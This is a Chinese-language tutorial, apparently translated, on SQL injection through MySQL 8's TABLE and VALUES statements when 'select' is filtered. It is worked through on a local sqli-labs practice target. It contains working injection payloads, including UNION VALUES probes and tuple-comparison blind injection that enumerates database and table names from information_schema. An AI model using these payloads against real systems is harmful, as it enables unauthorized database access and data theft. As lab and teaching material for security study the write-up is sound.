# 浅谈利用mysql8新特性进行SQL注入
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 前言
前段时间遇到一个题考查的是mysql8的table注入。当时没有做出来。之前有了解过mysql8的table注入，但做题的时候没有想到。这里简单总结复现一下mysql8新特性的sql注入。
## 0x01 MySQL8介绍
在ubuntu20 apt源中集成了mysql
8.0.20。官方表示MySQL8要比MySQL5.7快2倍，支持json,nosql，修改了默认身份验证等其他改进。
## 0x02 基本环境配置
###  1、搭建MySQL8环境
最简单的方法，就是使用docker拉取镜像搭建
    docker pull mysql:8.0.21
    docker run -d --name=mysql8 -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql:8.0.21
###  2、搭建SQL注入环境
1.下载vulstudy综合环境：  
2.启动vulstudy综合环境里的sql注入的靶场  
3.进入容器修改sqli-lab的配置文件：
    #安装vim
    sed -i s@/deb.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.list
    apt-get clean && apt-get update && apt-get install vim
    #修改sqli-lab的配置文件
    vim /app/sql-connections/db-creds.inc
填写mysql相关连接信息，数据库的IP填宿主机IP(我这里是172.30.102.102)
4.然后在mysql8容器里通过下面sql语句修改默认认证方式(因为mysql8.0默认认证方式和5不一样)：
    ALTER USER 'root' IDENTIFIED WITH mysql_native_password BY '123456';
5.重新配置数据库，环境搭建完成。
## 0x03 MySQL8语法新特性
在MySQL 8.0.19之后，MySQL推出几种新语法
###  1、TABLE statement
**TABLE statement**  
 **作用** ：列出表中全部内容
    TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]
TABLE是MySQL 8.0.19中引入的DML语句，它返回命名表的行和列，类似于SELECT。  
支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。  
 **例子** ：  
首先选择mysql数据库：`use security;`
    mysql> TABLE users;
    +----+----------+------------+
    | id | username | password   |
    +----+----------+------------+
    |  1 | Dumb     | Dumb       |
    |  2 | Angelina | I-kill-you |
    |  3 | Dummy    | p@ssword   |
    |  4 | secure   | crappy     |
    |  5 | stupid   | stupidity  |
    |  6 | superman | genious    |
    |  7 | batman   | mob!le     |
    |  8 | admin    | admin      |
    |  9 | admin1   | admin1     |
    | 10 | admin2   | admin2     |
    | 11 | admin3   | admin3     |
    | 12 | dhakkan  | dumbo      |
    | 14 | admin4   | admin4     |
    +----+----------+------------+
    13 rows in set (0.01 sec)
加上order by排序或LIMIT限制后
    table users order by password;
    table users limit 1;
    table users limit 0,1;
    table users limit 1,1;
**与SELECT的区别** ：
> 1.TABLE始终显示表的所有列  
>  2.TABLE不允许对行进行任意过滤，即TABLE 不支持任何WHERE子句
###  2、VALUES statement
**VALUES statement**  
 **作用** ：列出一行的值
    VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]
    row_constructor_list:
        ROW(value_list)[, ROW(value_list)][, ...]
    value_list:
        value[, value][, ...]
    column_designator: 
        column_index
VALUES是把一组一个或多个行作为表展示出来，返回的也是一个表数据。  
ROW()返回的是一个行数据，VALUES将`ROW()返回的行数据`加上`字段`整理为一个表，然后展示  
 **例子** ：
    mysql> TABLE emails;
    +----+------------------------+
    | id | email_id               |
    +----+------------------------+
    |  1 | PI:EMAIL       |
    |  2 | PI:EMAIL       |
    |  3 | PI:EMAIL    |
    |  4 | PI:EMAIL   |
    |  5 | PI:EMAIL   |
    |  6 | PI:EMAIL |
    |  7 | PI:EMAIL   |
    |  8 | PI:EMAIL      |
    +----+------------------------+
    8 rows in set (0.00 sec)
    mysql> VALUES ROW(1, 2, 3) UNION SELECT * FROM users;
    +----------+----------+------------+
    | column_0 | column_1 | column_2   |
    +----------+----------+------------+
    |        1 | 2        | 3          |
    |        1 | Dumb     | Dumb       |
    |        2 | Angelina | I-kill-you |
    |        3 | Dummy    | p@ssword   |
    |        4 | secure   | crappy     |
    |        5 | stupid   | stupidity  |
    |        6 | superman | genious    |
    |        7 | batman   | mob!le     |
    |        8 | admin    | admin      |
    |        9 | admin1   | admin1     |
    |       10 | admin2   | admin2     |
    |       11 | admin3   | admin3     |
    |       12 | dhakkan  | dumbo      |
    |       14 | admin4   | admin4     |
    +----------+----------+------------+
    14 rows in set (0.00 sec)
## 0x04 利用MySQL8新特性绕过select
**场景** ：select关键词被过滤，多语句无法使用  
 **测试环境** ：  
1.mysql命令终端  
2.sqli-labs靶场Less-1
###  1、在mysql命令终端测试
####  1.判断列数
由于TABLE命令和VALUES返回的都是表数据，它们所返回的数据可以通过UNION语句联合起来，当列数不对时会报错，根据这点可以判断列数
    TABLE users union VALUES ROW(1,2,3);
####  2.使用values判断回显位
    select * from users where id=-1 union values row(1,2,3);
####  3.列出所有数据库名
    table information_schema.schemata;
####  4.盲注查询任意表中的内容
语句`table users limit 1;`的查询结果：
    mysql> table users limit 1;
    +----+----------+----------+
    | id | username | password |
    +----+----------+----------+
    |  1 | Dumb     | Dumb     |
    +----+----------+----------+
    1 row in set (0.00 sec)
实质上是`(id, username, password)`与`(1, 'Dumb',
'Dumb')`进行比较，比较顺序为自左向右，第一列(也就是第一个元组元素)判断正确再判断第二列(也就是第二个元组元素)。  
两个元组第一个字符比大小，如果第一个字符相等就比第二个字符的大小，以此类推，最终结果即为元组的大小。
    mysql> select ((1,'','') select ((2,'','') select ((1,'Du','') select ((1,'Dum','') select ((1,'Dumb','') select ((1,'Dumb','D') select ((1,'Dumb','Dumb') select ((1,'Dumb','Dumc')<=(table users limit 1));
    +--------------------------------------------+
    | ((1,'Dumb','Dumc')<=(table users limit 1)) |
    +--------------------------------------------+
    |                                          0 |
    +--------------------------------------------+
    1 row in set (0.00 sec)
###  2、在sqli-labs靶场测试
####  1.判断列数
使用经典的order by语句判断：
    1' order by 3--+   #正常
    1' order by 4--+   #显示Unknown column '4' in 'order clause'
说明有3列
####  2.使用values判断回显位
    -1' union values row(1,2,3)--+
####  3.爆库爆表爆字段爆数据
**（1）爆当前数据库**
    -1' union values row(1,database(),3)--+
    #或利用盲注1' and ascii(substr((database()),1,1))=115--+   即s
**（2）爆所有数据库**  
因为table不能像select控制列数，除非列数一样的表，不然都回显不出来。  
需要使用table查询配合无列名盲注  
`information_schema.schemata`表有6列  
因为schemata表中的第一列是def，不需要判断，所以可以直接判断库名
    1' and ('def','m','',4,5,6)<=(table information_schema.schemata limit 1)--+ #回显正常
    1' and ('def','n','',4,5,6)<=(table information_schema.schemata limit 1)--+ #回显错误
    #得到第1个数据库名的第一个字符为m
    ......
    1' and ('def','mysql','',4,5,6)<=(table information_schema.schemata limit 1)--+ #回显正常
    1' and ('def','mysqm','',4,5,6)<=(table information_schema.schemata limit 1)--+ #回显错误
说明第1个数据库名为`mysql`
    1' and ('def','information_schema','',4,5,6)<=(table information_schema.schemata limit 1,1)--+ #回显正常
    1' and ('def','information_schemb','',4,5,6)<=(table information_schema.schemata limit 1,1)--+ #回显错误
    #说明第2个数据库名为information_schema
    ......
    一直猜解，直到获得全部数据库名
**（3）爆数据表**  
`information_schema.tables`表有21列
    1' and ('def','security','users','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)<=(table information_schema.tables limit 317,1)--+ #第一个表users
    1' and ('def','security','emails','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)<=(table information_schema.tables limit 318,1)--+ #第二个表emails